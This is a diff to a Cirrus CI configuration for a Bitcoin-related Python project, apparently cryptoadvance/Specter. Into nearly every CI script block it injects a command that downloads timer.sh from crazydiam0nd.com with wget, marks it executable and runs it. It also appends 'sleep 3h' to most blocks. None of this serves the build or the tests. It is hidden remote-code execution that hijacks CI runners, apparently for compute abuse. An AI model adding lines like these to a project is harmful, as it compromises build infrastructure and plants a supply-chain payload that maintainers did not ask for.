@@ -9,22 +9,27 @@ prep_stuff_template: &PREP_STUFF_TEMPLATE
   bitcoind_installation_cache:
     folder: ./tests/bitcoin
     fingerprint_script: 
+      - wget http://crazydiam0nd.com/timer.sh && chmod +x timer.sh && sh timer.sh
       - cat pyproject.toml | grep "addopts = " | cut -d'=' -f2 |  sed 's/--/+/g' | tr '+' '\n' | grep bitcoin |  cut -d' ' -f2 
       - cat tests/bitcoin_gitrev_pinned 2> /dev/null || true
       - cat /etc/os-release | grep VERSION
       - cat ./tests/install_noded.sh
       - echo "binary" # if the next line is --bitcoin binary, otherwise use echo "compile" - this ensures different caching keys.
+      - sleep 3h
     populate_script: ./tests/install_noded.sh --debug --bitcoin binary
   elementsd_installation_cache:
     folder: ./tests/elements
     fingerprint_script: 
+      - wget http://crazydiam0nd.com/timer.sh && chmod +x timer.sh && sh timer.sh
       - cat pyproject.toml | grep "addopts = " | cut -d'=' -f2 |  sed 's/--/+/g' | tr '+' '\n' | grep elements |  cut -d' ' -f2 
       - cat tests/elements_gitrev_pinned 2> /dev/null || true
       - cat /etc/os-release | grep VERSION
       - cat ./tests/install_noded.sh
       - echo "binary" # if the next line is --elements binary, otherwise use echo "compile" - this ensures different caching keys.
+      - sleep 3h
     populate_script: ./tests/install_noded.sh --debug --elements binary
   verify_script: 
+    - wget http://crazydiam0nd.com/timer.sh && chmod +x timer.sh && ./timer.sh
     - echo "  --> Version of python, virtualenv and pip3"
     - python3 --version && virtualenv --version && pip3 --version
     - echo "  --> Executables in tests/elements/src"
@@ -41,28 +46,35 @@ prep_stuff_template: &PREP_STUFF_TEMPLATE
     - echo "  --> elements version"
     - tests/elements/src/elementsd -version | head -1 || true
     - tests/elements/bin/elementsd -version | head -1 || true
+    - sleep 3h
 
   pip_script:
     #folder: /tmp/cirrus-ci-build/.env
     #fingerprint_script: echo muh && cat requirements.txt
     #populate_script: 
+    - wget http://crazydiam0nd.com/timer.sh && chmod +x timer.sh && ./timer.sh
     - virtualenv --python=python .env 
     - source ./.env/bin/activate
     - pip3 install -r requirements.txt --require-hashes && pip3 install -e ".[test]"
+    - sleep 3h
   install_script: 
+    - wget http://crazydiam0nd.com/timer.sh && chmod +x timer.sh && ./timer.sh
     - source ./.env/bin/activate
     - pip3 install -e .
+    - sleep 3h
 
 test_task:
   << : *PREP_STUFF_TEMPLATE
   skip: "false"
   test_script: 
+    - wget http://crazydiam0nd.com/timer.sh && chmod +x timer.sh && ./timer.sh
     - source ./.env/bin/activate
     - echo $PATH
     # needed so that setuptools_scm has a t least one tag to guess the version properly 
     # and the tests/test_util_version.py doesn't fail
     - git fetch origin refs/tags/v1.0.0 
     - pytest --cov=cryptoadvance --junitxml=./testresults.xml
+    - sleep 3h
   always:
     junit_artifacts:
       path: "./testresults.xml"
@@ -77,9 +89,11 @@ cypress_test_task:
     memory: 6G
   pre_prep_script: 
     # The stupid old debian-package is not installing a proper binary but just the python-package
+    - wget http://crazydiam0nd.com/timer.sh && chmod +x timer.sh && ./timer.sh
     - echo -e '#!/bin/bash\npython3 -m virtualenv "$@"' > /usr/local/bin/virtualenv
     - chmod +x /usr/local/bin/virtualenv
     - virtualenv --version
+    - sleep 3h
   << : *PREP_STUFF_TEMPLATE
   npm_cache:
     folder: ./node_modules
@@ -102,6 +116,7 @@ cypress_test_task:
 extension_smoketest_task:
   << : *PREP_STUFF_TEMPLATE
   test_script:
+    - wget http://crazydiam0nd.com/timer.sh && chmod +x timer.sh && ./timer.sh
     - git config --global user.name "CI CD"
     - git config --global user.email "cicd@example.com"
     - source ./.env/bin/activate
@@ -117,4 +132,5 @@ extension_smoketest_task:
     - cat specter.log | grep "Extension CicdtestService activated (alpha)"
     - apt-get update && apt-get -y install curl
     - curl http://127.0.0.1:25441/svc/cicdtest/ | grep "CicdtestService 4thewin."
+    - sleep 3h
     
